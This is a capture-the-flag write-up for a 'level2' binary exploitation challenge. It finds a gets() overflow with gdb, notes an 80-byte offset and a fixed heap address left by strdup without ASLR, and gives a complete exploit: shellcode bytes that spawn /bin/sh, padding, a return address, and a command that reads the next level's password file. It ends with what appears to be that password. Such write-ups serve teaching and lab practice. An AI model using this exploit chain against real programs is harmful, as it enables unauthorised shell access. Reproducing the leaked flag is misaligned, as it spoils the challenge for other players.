 ▄▄▄▄                                    ▄▄▄▄                 ▄▄▄▄▄
 ▀▀██                                    ▀▀██                █▀▀▀▀██▄
   ██       ▄████▄   ██▄  ▄██   ▄████▄     ██                      ██
   ██      ██▄▄▄▄██   ██  ██   ██▄▄▄▄██    ██                    ▄█▀
   ██      ██▀▀▀▀▀▀   ▀█▄▄█▀   ██▀▀▀▀▀▀    ██                  ▄█▀
   ██▄▄▄   ▀██▄▄▄▄█    ████    ▀██▄▄▄▄█    ██▄▄▄             ▄██▄▄▄▄▄
    ▀▀▀▀     ▀▀▀▀▀      ▀▀       ▀▀▀▀▀      ▀▀▀▀             ▀▀▀▀▀▀▀▀

gdb level2
disas main shows the exectuables, calls p(), then returns
p() calls gets(), -> buffer overflow.

We find the required input for overflow just like in level1:

echo 'run < <(echo {TEST_STRING})' | gdb executables/level2
> Program received signal SIGSEGV, Segmentation fault.
> 0x37634136 in ?? ()
offset: 80

We use a shellcode specially made for gets():
http://shell-storm.org/shellcode/files/shellcode-219.php

/!\ We run into an issue /!\
The program checks the return pointer ! (cmp    $0xb0000000,%eax)

However, it calls strdup(), thus copying the shellcode to the heap at address 0x08040a08.
This address is always the same due to the lack of ASLR.

################################################################################
f=/tmp/l2

printf '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' > $f \
&& printf '%.0s-' {1..25} >> $f \
&& printf '\x08\xa0\x04\x08' >> $f

cat $f - | ./level2
$ cat /home/user/level3/.pass
################################################################################

492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
